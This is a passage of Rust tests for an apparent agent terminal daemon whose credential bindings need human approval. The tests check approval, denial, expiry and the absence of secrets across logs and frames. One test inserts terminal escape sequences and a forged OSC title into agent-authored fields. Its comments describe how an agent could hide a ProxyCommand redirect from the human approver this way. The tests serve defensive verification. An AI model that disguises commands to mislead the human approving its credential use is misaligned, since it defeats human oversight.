    /// queue, then answer the waiting call with the **count**.
    ///
    /// This is what makes "falls through to the human-prompt path" an
    /// assertion about a human completing the call, rather than about a
    /// frame having been broadcast at one.
    async fn answer_as_a_human(server: &HoldfastServer, session: &Session, bytes: &[u8]) {
        let hub = server.attach_hub();
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        while !hub.secrets().has_waiter(&session.id) {
            assert!(
                tokio::time::Instant::now() < deadline,
                "the call never fell through to the prompt path"
            );
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        let id = hub
            .secrets()
            .outstanding(&session.id)
            .expect("outstanding")
            .request_id;
        let raised = hub
            .secrets()
            .take(&session.id, Some(&id))
            .expect("the raise is still there");
        let (write, ack) = crate::session::WriteRequest::secret(SecretBytes::normalise(
            bytes.to_vec(),
            raised.append_newline,
        ));
        session
            .write_queue()
            .send(write)
            .await
            .expect("the write queue accepted");
        let n = ack
            .await
            .expect("the writer answered")
            .expect("the PTY took the write");
        raised.answer(crate::secret::Resolution::Provided {
            bytes_written: n as u64,
        });
        hub.broadcast_secret_closed(&session.id, &id, "fulfilled");
    }

    /// The tool call on its own task, so the row can go on to answer it.
    fn spawn_call(
        server: &HoldfastServer,
        args: RequestSecretInputArgs,
    ) -> tokio::task::JoinHandle<Value> {
        let server = server.clone();
        tokio::spawn(async move {
            body(
                &server
                    .request_secret_input(Parameters(args))
                    .await
                    .expect("request_secret_input"),
            )
        })
    }

    async fn joined(call: tokio::task::JoinHandle<Value>, what: &str) -> Value {
        tokio::time::timeout(Duration::from_secs(60), call)
            .await
            .unwrap_or_else(|_| panic!("{what} never returned"))
            .expect("the call")
    }

    /// A `require_confirm` binding whose provider is a script this row
    /// wrote — §9.6's *"ask me first"*, with something to ask about.
    fn confirming(sc: &mut Scratch, short: &str, match_command: &str) -> SecretBinding {
        let mut b = sc.binding(short, match_command, &format!("printf '{PROBE}\\n'\n"));
        b.require_confirm = true;
        b
    }

    /// The one `binding_approval` line for a session, or `None`.
    fn approval_line(sc: &Scratch, session_id: &str) -> Option<Value> {
        let lines: Vec<Value> = sc
            .audit(session_id)
            .into_iter()
            .filter(|e| e["kind"] == "binding_approval")
            .collect();
        assert!(
            lines.len() <= 1,
            "one approval must produce at most one line: {lines:?}"
        );
        lines.into_iter().next()
    }

    /// **An approval is a decision about a *named* binding, and
    /// [`autofill_approved`] resolves nothing if the session no longer
    /// selects that name.**
    ///
    /// The window between raising an approval and answering it is
    /// human-scale — up to `min(binding_approval_timeout_secs, remaining /
    /// 2)` — and §9.6 probes bindings *"in configured order"* against a
    /// prompt line that can move inside it. Without the name check, a
    /// human who approved `prod-ssh` could have released `staging-db`.
    ///
    /// Driven directly rather than through the round trip, because the
    /// round trip cannot make the selection move on demand: the branch is
    /// reachable only from a state a socket-level row would have to race
    /// for.
    #[test]
    fn an_approval_resolves_only_the_binding_whose_name_was_approved() {
        let mut sc = Scratch::new("approvedname");
        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        let audit = &server.processor.audit;
        let s = session_running("ssh", &["prod-01"], "sleep 30");

        // A name the session does not select resolves nothing and runs
        // nothing — reported as `NoBindingMatched`, which is what it is
        // from the caller's side and what every fall-through looks like
        // to the agent.
        let out = autofill_approved(
            &keychain_mode(vec![b.clone()]),
            &s,
            "some-other-binding",
            true,
            audit,
        );
        assert!(
            matches!(out, Autofill::FellThrough(FellThrough::NoBindingMatched)),
            "{out:?}"
        );
        assert!(
            !sc.ran("prod-ssh"),
            "a binding nobody approved read the credential store"
        );
        assert!(
            s.binding_uses().is_empty(),
            "a refused approval still spent a use: {:?}",
            s.binding_uses()
        );

        // **The pairing**: the same call with the name that *was*
        // approved resolves, so the refusal above is about the name and
        // not about a function that never resolves anything.
        let out = autofill_approved(&keychain_mode(vec![b.clone()]), &s, &b.name, true, audit);
        match out {
            Autofill::Resolved(r) => {
                assert_eq!(r.binding_name, b.name);
                assert_eq!(r.use_count, 1);
            }
            other => panic!("the approved name did not resolve: {other:?}"),
        }
        assert!(sc.ran("prod-ssh"));

        let _ = s.signal(Signal::Kill);
    }

    // ------------------------------------------ §17.5's four terminals

    /// **The positive control for every absence assertion below.**
    ///
    /// A human approves, the reference resolves, and the child gets the
    /// value — an approval path that resolved *nothing* would satisfy
    /// every "the value is absent from…" row in this file.
    #[tokio::test]
    async fn approving_injects_the_value() {
        let mut sc = Scratch::new("approve");
        let b = confirming(&mut sc, "prod-ssh", "^ssh\\s+(\\S+@)?prod-0[12]\\b");
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        let s = session_running("ssh", &["user@prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        let call = spawn_call(&server, secret_args(&s.id, 20));
        let approval = await_approval(&server, &s.id).await;

        // The frame reached the client, and it is §7.5's frame: the
        // binding's name, its provider, and **the command line that would
        // receive the credential**, so a human can see *which* credential
        // is about to be used and *what for*.
        let frame = client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        let ServerFrame::BindingApprovalRequired {
            approval_id,
            binding_name,
            command_line,
            provider,
            session,
            ..
        } = frame
        else {
            unreachable!()
        };
        assert_eq!(approval_id, approval.approval_id);
        assert_eq!(binding_name, b.name);
        assert_eq!(provider, "pass");
        assert_eq!(session, s.id);
        // GH #45. Without this the human is approving the label
        // `prod-ssh`, which reads identically for `ssh user@prod-01` and
        // for a line the agent appended a transport redirect to — and
        // deciding between those two is the entire purpose of asking.
        assert_eq!(
            command_line, "ssh user@prod-01",
            "the approval frame does not say what the credential would be used for"
        );
        // Nothing has resolved yet: §9.6's "ask me first" is answered
        // **before** the store is touched, not after.
        assert!(
            !sc.ran("prod-ssh"),
            "the provider ran before anybody approved"
        );

        assert_eq!(
            decide(
                &server,
                &s.id,
                &approval.approval_id,
                ApprovalDecision::Approve,
                "cli"
            ),
            crate::secret::Decide::Recorded
        );

        let payload = joined(call, "the approved call").await;
        assert_eq!(payload["status"], "secret_provided", "{payload}");
        assert_eq!(payload["data"]["bytes_written"], (PROBE.len() + 1) as u64);
        assert!(sc.ran("prod-ssh"), "approval did not run the provider");

        // The arrival proof, on the child's own output.
        let seen = buffer_until(&s, b"got=HUNTER2", 20).await;
        assert!(
            !contains(&seen, PROBE.as_bytes()),
            "the resolved value reached the ring buffer"
        );

        // §9.4's two lines, in order: the decision, then the resolution.
        assert_eq!(
            sc.kinds(&s.id),
            vec![
                "binding_approval".to_string(),
                "binding_resolved".to_string()
            ],
            "an approved binding writes the decision and the resolution, and no prompt \
             path ran"
        );
        let line = approval_line(&sc, &s.id).expect("a binding_approval line");
        assert_eq!(line["approval_id"], approval.approval_id);
        assert_eq!(line["binding_name"], b.name);
        assert_eq!(line["outcome"], "approved");
        assert_eq!(
            line["decided_by"], "cli",
            "decided_by is the deciding connection's handshake client_kind (§9.4, Q11)"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// The approval frame's `command_line` is **redacted and
    /// control-character-stripped**, and the **matcher's** subject is
    /// neither — one row, because the rules pull in opposite directions
    /// and an implementation that unified them would break exactly one.
    ///
    /// The session's argv carries a GitHub token *and* an argument built
    /// out of `\x1b[2K` and `\r`. `command`/`args` are the agent's own
    /// strings and this frame fans out to every attached client, so:
    ///
    /// * the **token** must not reach the wire — the ordinary redaction
    ///   rule every other string on this socket follows; and
    /// * the **control characters** must not reach a human's terminal.
    ///   `\x1b[2K\r` erases the line and returns the cursor to its start,
    ///   so an agent can make `ssh prod-01 -o ProxyCommand=…` render as
    ///   `ssh prod-01` — which is the exact distinction this field was
    ///   added to make visible. Redaction alone does not touch them: no
    ///   rule matches an escape sequence.
    ///
    /// But `select` must see **neither** transformation: matching a
    /// processed line would let the redactor decide which binding fires,
    /// which is the defect `match_prompt_is_matched_against_the_unredacted_line`
    /// pins one layer over.
    ///
    /// **The pattern is what makes every half load-bearing.** It spells
    /// the token's *shape* and the control bytes out to the end of the
    /// line, so a matcher reading either a `[REDACTED:github]` or a
    /// stripped argument selects nothing, no approval is raised, and
    /// `await_approval` times out — the row fails at the top rather than
    /// reporting a rendering it never reached.
    #[tokio::test]
    async fn the_approval_command_line_is_rendered_for_a_human_and_the_matchers_subject_is_not() {
        const TOKEN: &str = "ghp_0123456789abcdefghijABCDEFGHIJ012345";
        // Erase-line, then carriage return: on a terminal, everything
        // before it disappears and what follows is drawn over it.
        const NOISY: &str = "\x1b[2K\rall clear";

        let mut sc = Scratch::new("apprredact");
        let pattern = format!(
            "^ssh\\s+prod-01\\s+--token\\s+ghp_[0-9A-Za-z]{{36}}\\s+{}$",
            regex::escape(NOISY)
        );
        // Built at run time, so it is proved loadable rather than listed
        // (GH #45 M-7) — against the command line it is written for,
        // which is the one this row's session actually runs.
        assert_fixture_pattern_loads(&pattern, &format!("ssh prod-01 --token {TOKEN} {NOISY}"));
        let b = confirming(&mut sc, "prod-ssh", &pattern);
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        let s = session_running(
            "ssh",
            &["prod-01", "--token", TOKEN, NOISY],
            ECHO_OFF_FIXTURE,
        );
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        // **The agent's `prompt_text` is the frame's other agent-authored
        // string**, and the re-review found it unstripped on the very
        // frame this work hardened (GH #45 J-3). It rides along here
        // rather than in a row of its own: the same call raises
        // `BindingApprovalRequired` with it and then, on the denial below,
        // `AwaitingSecret` with it too — so one row covers both frames.
        let call = spawn_call(
            &server,
            RequestSecretInputArgs {
                prompt_text: "\u{1b}]0;forged\u{7}password for prod-01:\rall clear".into(),
                ..secret_args(&s.id, 20)
            },
        );
        // Reaching here at all is the second half: the binding selected,
        // so `select` saw the token and not a marker.
        let approval = await_approval(&server, &s.id).await;

        let frame = client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        let ServerFrame::BindingApprovalRequired { command_line, .. } = frame else {
            unreachable!()
        };
        assert!(
            !command_line.contains(TOKEN),
            "the agent's own argument put a token on a frame that fans out to every \
             attached client: {command_line}"
        );
        assert!(
            command_line.contains("[REDACTED:github]"),
            "the command line is not redacted, it is merely missing the token — which \
             a truncation would also produce: {command_line}"
        );
        // Redacted **element-wise and then joined**, not joined and then
        // redacted: the arguments either side of the token are intact, so
        // an operator can still read what the credential would be used
        // for. That is the ordering §9.4's `session_record` requires and
        // the reason this assertion is here rather than only the two
        // above.
        assert!(
            command_line.starts_with("ssh prod-01 --token "),
            "the redactor ate across an argument boundary: {command_line}"
        );

        // **Not one control character reaches the human's terminal.** The
        // whole set, not just the two this row inserted: a field that
        // survives `\x1b` and `\r` but passes `\x08` is a field an agent
        // rubs out one character at a time.
        assert!(
            !command_line.chars().any(char::is_control),
            "a control character reached the line a human is asked to approve, so the \
             agent can rewrite it: {command_line:?}"
        );
        assert!(
            !command_line.contains("\x1b["),
            "an escape sequence survived as text: {command_line:?}"
        );
        // **The payload's text stays — only its power to overwrite is
        // gone.** A field that silently *dropped* the argument would pass
        // the two assertions above while hiding the thing the operator
        // most needs to see, which is a forged **short** line and is layer
        // D inverted. That was a live defect for one revision, when this
        // was built through `ansi::strip`; `ansi::a_string_sequence_cannot_forge_a_short_line`
        // is the unit half.
        assert!(
            command_line.ends_with("[2Kall clear"),
            "the argument was dropped rather than de-fanged, which hides it from the \
             human instead of showing it: {command_line:?}"
        );
        assert_eq!(approval.command_line, command_line);

        assert_eq!(
            decide(
                &server,
                &s.id,
                &approval.approval_id,
                ApprovalDecision::Deny,
                "cli"
            ),
            crate::secret::Decide::Recorded
        );
        // Denied, so the call falls through to the prompt path and ends on
        // its own deadline. Awaited rather than dropped, so the row leaves
        // nothing running.
        let payload = joined(call, "the denied call").await;
        assert_eq!(payload["status"], "secret_cancelled", "{payload}");
        assert!(!sc.ran("prod-ssh"), "a denied approval ran the provider");

        // **Both frames, both `prompt_text`s.** The denial falls through
        // to the prompt path, so this client has seen a
        // `BindingApprovalRequired` and an `AwaitingSecret`, each carrying
        // the agent's own string.
        client.drain();
        assert!(
            client.has(is_approval) && client.has(is_awaiting),
            "the flow did not produce both frames, so this assertion is about one of \
             them: {:?}",
            client.seen
        );
        for f in &client.seen {
            let (which, text) = match f {
                ServerFrame::BindingApprovalRequired { prompt_text, .. } => {
                    ("BindingApprovalRequired", prompt_text)
                }
                ServerFrame::AwaitingSecret { prompt_text, .. } => ("AwaitingSecret", prompt_text),
                _ => continue,
            };
            assert!(
                !text.chars().any(char::is_control),
                "{which}.prompt_text carries a control character to every attached \
                 client, and `holdfast attach` writes that field to the terminal \
                 unmodified: {text:?}"
            );
            // De-fanged, not deleted — the OSC payload is the
            // forged-short-line case (N-3) on this field rather than on
            // `command_line`.
            //
            // **Only on the approval frame.** The `AwaitingSecret` here
            // carries the *child's* prompt line (`Password: `) rather than
            // the agent's: the echo drop raised the request first and this
            // call adopted it, which is §5.2's ordinary path. That line
            // goes through the same `redact_for_display`, which is what
            // the control-character assertion above covers for it.
            if which == "BindingApprovalRequired" {
                assert!(
                    text.contains("forged") && text.ends_with("all clear"),
                    "the agent's prompt was consumed rather than de-fanged: {text:?}"
                );
            }
        }

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// REQ-SEC-016, **and the ordering is the whole point**.
    ///
    /// The *reference* exists when the frame is built, so its absence
    /// from `BindingApprovalRequired` is a real assertion — asserted
    /// beside the fact that `binding_name` and `provider` **are** there,
    /// which is what stops it being satisfied by an empty frame.
    ///
    /// The *value* does not exist at that moment at all: resolution
    /// happens only after approval, so "the value is absent from this one
    /// frame" is green against every implementation there could be,
    /// including one that leaks a second later. So it is asserted across
    /// **every frame the client received for the whole flow**, before and
    /// after approval, plus the `binding_approval` line and the whole
    /// audit file.
    #[tokio::test]
    async fn the_approval_surface_carries_no_reference_and_no_value() {
        let mut sc = Scratch::new("surface");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        // **Driven through §16.4's ordinary shape — an echo drop raised
        // first, then the call adopting it — and that is not decoration.**
        // On a cold call the client sees exactly *one* frame for the whole
        // flow, and "no value in any frame" over one pre-resolution frame
        // is the vacuous form this row exists not to be. With a raise
        // outstanding, the approved resolution also closes it, so the
        // client sees frames on **both** sides of the decision. The raise
        // and its broadcast are the two lines `attach::conn`'s
        // `forward_events` runs on an `AwaitingSecretEntered` edge; there
        // is no connection here to run them.
        let hub = server.attach_hub();
        let (raised, first) = hub.raise_secret(&s.id, &s.prompt_last_line_redacted());
        assert!(first, "the fixture must be the one that raised");
        hub.broadcast_awaiting_secret(&s.id, &raised.request_id, &raised.prompt_text);

        let call = spawn_call(&server, secret_args(&s.id, 20));
        let approval = await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;

        // Half one: the reference. It is in the daemon's config right
        // now, so leaving it out of the frame is a decision.
        let encoded = format!("{:?}", client.seen);
        assert!(
            !encoded.contains(REFERENCE),
            "the binding reference reached an attach frame: {encoded}"
        );
        assert!(
            encoded.contains(&b.name) && encoded.contains("pass"),
            "the frame carries neither the binding name nor the provider, so the absence \
             above is not evidence of anything: {encoded}"
        );

        decide(
            &server,
            &s.id,
            &approval.approval_id,
            ApprovalDecision::Approve,
            "ui-bridge",
        );
        let payload = joined(call, "the approved call").await;
        assert_eq!(payload["status"], "secret_provided", "{payload}");
        buffer_until(&s, b"got=HUNTER2", 20).await;

        // Half two: the value, across everything the client ever saw —
        // which now includes the frames sent *after* resolution.
        client
            .wait_for("SecretRequestClosed", |f| {
                matches!(f, ServerFrame::SecretRequestClosed { .. })
            })
            .await;
        let encoded = format!("{:?}", client.seen);
        assert!(
            client.has(is_awaiting) && client.has(is_approval),
            "the flow did not produce frames on both sides of the decision, so 'every \
             frame' is one frame: {encoded}"
        );
        assert!(
            !encoded.contains(PROBE) && !encoded.contains(REFERENCE),
            "a resolved value or reference reached an attach frame: {encoded}"
        );
        let trail = sc.audit_text();
        assert!(
            !trail.contains(PROBE) && !trail.contains(REFERENCE),
            "a resolved value or reference reached the audit trail"
        );
        assert!(
            !payload.to_string().contains(PROBE) && !payload.to_string().contains(REFERENCE),
            "the MCP response carries one of them: {payload}"
        );

        // **The anti-vacuity control**: neither string matches a built-in
        // redaction rule, so their absence above is this module's doing
        // and not the redactor's.
        let rules = &server.processor.rules;
        assert_eq!(crate::output::redact::redact_str(rules, PROBE), PROBE);
        assert_eq!(
            crate::output::redact::redact_str(rules, REFERENCE),
            REFERENCE
        );
        // And the trail is non-empty and is this session's, so "not in
        // the file" is not "there is no file".
        assert!(trail.contains(&s.id), "the audit trail is empty");

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **Task 13's second absence row: every surface, for a value Holdfast
    /// *resolved* rather than received.**
    ///
    /// `tests/secrets.rs` proves the same property for a value a human
    /// typed, and it cannot prove this one: a `binding_resolved` line is
    /// written only when a provider **answers**, the only provider a test
    /// may run is a script the test itself wrote (REQ-TST-007 / Global
    /// Constraint 12), and `ScriptProvider` is `#[cfg(test)]` — invisible
    /// from an integration target. So the row lives here, and the module
    /// header of `tests/secrets.rs` says so where a reader of the seven
    /// surfaces will look.
    ///
    /// The surfaces swept, in that header's numbering: **1** the MCP
    /// response, **2** the `secret_input_*` kinds (absent here, which is
    /// the assertion — this call never reaches the prompt path), **3**
    /// `binding_resolved` and `binding_approval`, **4** the
    /// `BindingApprovalRequired` frame and every other frame the client
    /// ever saw, **7** the ring buffer and a `read_output` response.
    /// **6** (`daemon.log`) is
    /// `secret::provider::tests::a_failing_providers_stderr_and_reference_reach_no_log`'s,
    /// which owns the fd-2 capture for this target; **5** (§9.5's notice)
    /// is not produced by a call that never falls through.
    ///
    /// ## The argv and environment clause, stated honestly
    ///
    /// The provider child **precedes** the value — it is what produces it
    /// — so "the value is not in this process's argv" is true of every
    /// implementation there could be. What the clause actually guards is a
    /// **second** process handed the value afterwards, and the load-bearing
    /// assertion is therefore the *count*: the fixture appends one record
    /// per invocation and exactly one record must exist by the end of the
    /// flow. The argv and environment contents are asserted beside it,
    /// with `PATH=` as the witness that a real environment was captured
    /// rather than an empty file compared against nothing.
    #[tokio::test]
    async fn a_keychain_resolved_secret_reaches_none_of_them_either() {
        let mut sc = Scratch::new("keychainabsent");
        let dump = sc.path("provider-argv-env.dump");
        // `$0` and `$@` and not `/proc/self/cmdline`: §11.3 runs this
        // suite on macOS as well, which has no `/proc`. For a `#!/bin/sh`
        // script the two are the same argv minus the interpreter, and the
        // interpreter is not what Holdfast chose.
        let mut b = sc.binding(
            "prod-ssh",
            SSH_PROD,
            &format!(
                "{{ printf 'argv:%s\\n' \"$0\" \"$@\"; env; echo '--invocation-end--'; }} \
                 >> '{}'\nprintf '{PROBE}\\n'\n",
                dump.display()
            ),
        );
        b.require_confirm = true;
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        // **§16.4's ordinary shape — an echo drop raised first — and it is
        // load-bearing here for the same reason it is in
        // `the_approval_surface_carries_no_reference_and_no_value`.** With
        // nothing outstanding the injection closes nothing, the client
        // sees exactly one frame for the whole flow, and "no value in any
        // frame" becomes a claim about one pre-resolution frame. The two
        // lines below are what `attach::conn`'s `forward_events` runs on an
        // `AwaitingSecretEntered` edge; there is no connection here to run
        // them.
        let hub = server.attach_hub();
        let (raised, first) = hub.raise_secret(&s.id, &s.prompt_last_line_redacted());
        assert!(first, "the fixture must be the one that raised");
        hub.broadcast_awaiting_secret(&s.id, &raised.request_id, &raised.prompt_text);

        let call = spawn_call(&server, secret_args(&s.id, 20));
        let approval = await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        assert!(
            !sc.ran("prod-ssh"),
            "the provider ran before anybody approved"
        );
        decide(
            &server,
            &s.id,
            &approval.approval_id,
            ApprovalDecision::Approve,
            "cli",
        );

        // ---- the positive control: the value reached the child.
        let payload = joined(call, "the approved call").await;
        assert_eq!(payload["status"], "secret_provided", "{payload}");
        assert_eq!(
            payload["data"]["bytes_written"],
            (PROBE.len() + 1) as u64,
            "the count is not the resolved value's written length"
        );
        assert!(sc.ran("prod-ssh"), "the provider never ran");
        let buf = buffer_until(&s, b"got=HUNTER2", 20).await;

        // ---- surface 1: the MCP response.
        assert!(
            !payload.to_string().contains(PROBE) && !payload.to_string().contains(REFERENCE),
            "the MCP response carries the value or the reference: {payload}"
        );

        // ---- surfaces 2 and 3: the audit trail, whole, with the kinds
        // this flow produces asserted as an exact list. An implementation
        // that wrote nothing at all satisfies every absence below.
        assert_eq!(
            sc.kinds(&s.id),
            vec![
                "binding_approval".to_string(),
                "binding_resolved".to_string()
            ],
            "an approved step-1 resolution writes the decision and the resolution, \
             and no prompt path ran"
        );
        let trail = sc.audit_text();
        assert!(
            !trail.contains(PROBE) && !trail.contains(REFERENCE),
            "the resolved value or the reference reached the audit trail:\n{trail}"
        );

        // ---- surface 4: every frame the client ever saw, on both sides
        // of the decision.
        client
            .wait_for("SecretRequestClosed", |f| {
                matches!(f, ServerFrame::SecretRequestClosed { .. })
            })
            .await;
        let encoded = format!("{:?}", client.seen);
        assert!(
            client.has(is_approval) && client.has(is_awaiting),
            "the flow did not produce frames on both sides of the decision, so \
             'every frame' is one frame: {encoded}"
        );
        assert!(
            !encoded.contains(PROBE) && !encoded.contains(REFERENCE),
            "a resolved value or reference reached an attach frame: {encoded}"
        );

        // ---- surface 7: the ring buffer, and the surface the agent
        // actually reads a session through.
        assert!(
            !contains(&buf, PROBE.as_bytes()),
            "the resolved value reached the ring buffer:\n{}",
            String::from_utf8_lossy(&buf)
        );
        //
        // **The raw sweep above is the redactor-independent one and this
        // one is not, and the difference is why both are here.**
        // `read_output` redacts, so an absence assertion over its response
        // is an assertion about a *redacted* rendering of the buffer.
        //
        // **For `PROBE` specifically the two are equivalent, and that is
        // measured rather than assumed**: `generic-secret-assignment`'s
        // value group is `[^\s"';,)]{8,}` and `hunter2` is seven bytes, so
        // `redact_str(rules, "Password: hunter2")` comes back unchanged —
        // the same fact the `redact_str` control at the end of this row
        // pins for the bare string. The assertion below is a real one for
        // this value.
        //
        // What the raw sweep buys is the *general* case: any leaked string
        // of eight or more bytes from that class, landing after a
        // `password`-ish label, comes back `[REDACTED:generic]` and passes
        // here.
        //
        // The same rule is why the witness is the child's **prompt** and
        // not its `got=` transform: `got=HUNTER2` *is* eleven bytes of that
        // class, so measured, `Password: got=HUNTER2` is redacted whole and
        // a `got=HUNTER2` witness here goes red.
        let read_body = body(
            &server
                .read_output(Parameters(crate::mcp::tools::ReadOutputArgs {
                    session: s.id.clone(),
                    since_cursor: Some(0),
                    ..Default::default()
                }))
                .await
                .expect("read_output"),
        );
        assert!(
            read_body["data"]["output"]
                .as_str()
                .is_some_and(|o| o.contains("Password: ")),
            "the read_output response carries none of this session's output, so \
             sweeping it proves nothing:\n{read_body}"
        );
        let read = read_body.to_string();
        assert!(
            !read.contains(PROBE),
            "the resolved value reached a read_output response:\n{read}"
        );

        // ---- the provider child's argv and environment.
        let dumped = std::fs::read_to_string(&dump).expect("the provider wrote its own argv");
        assert_eq!(
            dumped.matches("--invocation-end--").count(),
            1,
            "the value was resolved by one process and then handed to another:\n{dumped}"
        );
        assert!(
            dumped.contains(&format!("argv:{REFERENCE}")) && dumped.contains("PATH="),
            "the dump caught neither a real argv nor a real environment, so the \
             absences below prove nothing:\n{dumped}"
        );
        assert!(
            !dumped.contains(PROBE),
            "the resolved value reached a provider child's argv or environment:\n{dumped}"
        );

        // **The anti-vacuity control** for every absence above: neither
        // string matches a built-in redaction rule, so their absence is
        // this module's doing and not the redactor's.
        let rules = &server.processor.rules;
        assert_eq!(crate::output::redact::redact_str(rules, PROBE), PROBE);
        assert_eq!(
            crate::output::redact::redact_str(rules, REFERENCE),
            REFERENCE
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// REQ-SEC-017's first clause: a denial **falls through**, it does not
    /// fail.
    ///
    /// Returning an error on denial would make `require_confirm` a way to
    /// break a session rather than a way to gate a credential — and §18.1
    /// deleted `binding_approval_denied` for exactly that reason.
    #[tokio::test]
    async fn denying_falls_through_to_the_human_prompt() {
        let mut sc = Scratch::new("deny");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        let call = spawn_call(&server, secret_args(&s.id, 20));
        let approval = await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        decide(
            &server,
            &s.id,
            &approval.approval_id,
            ApprovalDecision::Deny,
            "ui-bridge",
        );

        // The fall-through is observable as the affordance the human is
        // supposed to get instead.
        client.wait_for("AwaitingSecret", is_awaiting).await;
        answer_as_a_human(&server, &s, b"typedbyahuman").await;

        let payload = joined(call, "the denied call").await;
        assert_eq!(
            payload["status"], "secret_provided",
            "a denial must fall through to the prompt and complete there: {payload}"
        );
        assert_eq!(payload["data"]["bytes_written"], 14u64);

        // **Nothing was resolved.** The provider never ran, so denial did
        // not merely discard a value it had already fetched.
        assert!(
            !sc.ran("prod-ssh"),
            "a denied binding still read the credential store"
        );
        let kinds = sc.kinds(&s.id);
        assert!(
            !kinds.iter().any(|k| k == "binding_resolved"),
            "a denied binding wrote a resolution: {kinds:?}"
        );
        assert!(
            kinds.iter().any(|k| k == "secret_input_request"),
            "the prompt path never ran: {kinds:?}"
        );
        let line = approval_line(&sc, &s.id).expect("a binding_approval line");
        assert_eq!(line["outcome"], "denied");
        assert_eq!(line["decided_by"], "ui-bridge");

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// REQ-SEC-017 again, by the other route: the window elapses.
    ///
    /// **`expired` has no decider and the field is absent**, not empty —
    /// treating expiry as denial-with-a-decider invents an actor in an
    /// authorisation record.
    #[tokio::test]
    async fn an_expired_approval_falls_through_the_same_way() {
        let mut sc = Scratch::new("expire");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
        let clock = Clock::manual(std::time::Instant::now());
        let server = server_full(
            keychain_mode(vec![b.clone()]),
            &sc.audit_log(),
            120,
            clock.clone(),
        );
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        await_prompt(&s, b"Password: ").await;

        // min(120, 60 / 2) = 30.
        let call = spawn_call(&server, secret_args(&s.id, 60));
        let approval = await_approval(&server, &s.id).await;
        client
            .wait_for("BindingApprovalRequired", is_approval)
            .await;
        // Yield first, so the wait is registered on the hand before it
        // moves. (`sleep_until` also re-checks under the lock, so this is
        // belt and braces rather than the correctness argument.)
        for _ in 0..8 {
            tokio::task::yield_now().await;
        }
        clock.advance(Duration::from_secs(30));

        client.wait_for("AwaitingSecret", is_awaiting).await;
        answer_as_a_human(&server, &s, b"typedbyahuman").await;
        let payload = joined(call, "the expired call").await;
        assert_eq!(payload["status"], "secret_provided", "{payload}");

        assert!(!sc.ran("prod-ssh"), "an expired approval ran the provider");
        let line = approval_line(&sc, &s.id).expect("a binding_approval line");
        assert_eq!(line["approval_id"], approval.approval_id);
        assert_eq!(line["outcome"], "expired");
        assert!(
            line.get("decided_by").is_none(),
            "an expiry has no decider and the field must be absent, not empty: {line}"
        );
        // The pairing for that absence: `denying_…` shows the field *is*
        // written when there is a decider, so this is a rule and not a
        // field nobody ever populates.

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **REQ-SEC-017's verification column, on shipped defaults.**
    ///
    /// §20 names this case by name: *"the expire case runs on default
    /// config (`binding_approval_timeout_secs` and `timeout_secs` both
    /// 120, nobody approves) and asserts the fall-through `AwaitingSecret`
    /// is broadcast **and** a human submission still returns
    /// `secret_provided` before the call's deadline — an implementation
    /// using the configured window unconditionally passes a deny-only
    /// suite and fails this."* Rev. 44 amended the requirement
    /// specifically to force it, and nothing in the tree ran it: the two
    /// expiry rows use `timeout_secs` 60 and 10, and no test anywhere put
    /// both knobs at 120.
    ///
    /// **The equality is the whole point.** `min(120, 120 / 2)` is the
    /// degenerate case, it is what an operator meets out of the box, and a
    /// guard that only ever runs with unequal knobs cannot see a
    /// regression that reappears only when they are equal. `min(configured,
    /// remaining)` without the halving gives 10 at 10/120 — which
    /// `the_approval_window_leaves_time_for_the_fall_through` is sensitive
    /// to — and 120 at the defaults, which is precisely the defect rev. 44
    /// named and which no existing row can see.
    ///
    /// Neither number is written out. `timeout_secs` is **omitted** from
    /// the arguments, so what is under test is
    /// `unwrap_or(DEFAULT_SECRET_TIMEOUT_SECS)`; the window comes from
    /// `DaemonConfig::default()`. A row that restated `120` twice would
    /// keep passing after somebody changed a default.
    #[tokio::test]
    async fn the_shipped_defaults_still_leave_room_for_the_fall_through() {
        let mut sc = Scratch::new("defaultexpire");
        let b = confirming(&mut sc, "prod-ssh", SSH_PROD);
